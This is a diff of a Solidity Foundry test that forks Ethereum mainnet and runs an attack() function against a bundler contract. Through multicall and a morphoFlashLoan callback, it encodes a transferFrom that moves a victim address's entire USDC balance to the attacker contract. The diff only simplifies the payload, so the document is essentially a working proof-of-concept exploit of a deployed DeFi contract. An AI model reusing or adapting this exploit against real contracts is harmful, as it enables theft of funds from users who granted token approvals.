@@ -1,7 +1,5 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 import {console, Test} from "forge-std/Test.sol";
 import "./test/interfaces/IERC20.sol";
 
@@ -23,9 +21,7 @@ contract transferfromTest is Test {
         vm.deal(address(this), 0);
         vm.createSelectFork("https://rpc.ankr.com/eth", 20679724);
         attacker = address(this);
-
-        // Initialize assets here
-        assets = usdc.balanceOf(morpho) / 2 / 2; // Amount to flash loan; adjust as needed
+        assets = usdc.balanceOf(morpho) / 2 / 2;
     }
 
     function testfransferfrom() public {
@@ -42,8 +38,7 @@ contract transferfromTest is Test {
     }
 
     function attack() internal {
-        // Initialize the array with two elements
-        bytes[] memory data = new bytes[](2);
+        bytes[] memory data = new bytes[](1);
 
 
         // bytes memory callbackData = abi.encodeWithSelector(
@@ -52,32 +47,12 @@ contract transferfromTest is Test {
         //     address(this),
         //     usdc.balanceOf(vic)
         // );
-
-        // Second element: Call morphoFlashLoan with the required parameters
         data[0] = abi.encodeWithSelector(
             bytes4(keccak256("morphoFlashLoan(address,uint256,bytes)")),
             token,
             assets,
             "",
-            abi.encodeWithSelector(bytes4(0x23b872dd), address(vic),address(this),usdc.balanceOf(vic))); // Empty data for the callback, adjust as needed
-
-        data[1] = abi.encodeWithSelector(
-            bytes4(keccak256("morphoFlashLoan(address,uint256,bytes)")),
-            token,
-            assets,
-            "",
             abi.encodeWithSelector(bytes4(0x23b872dd), address(vic),address(this),usdc.balanceOf(vic)));
-
-
-        // // First element: Transfer USDC from vic to the attacker
-        // data[1] = abi.encodeWithSelector(
-        //     bytes4(0x23b872dd), // transferFrom selector
-        //     address(vic),
-        //     address(this),
-        //     usdc.balanceOf(vic)
-        // );
-
-        // Call multicall with the two data elements
         EtherBundlerV2.multicall{value: 0}(data);
     }
 }
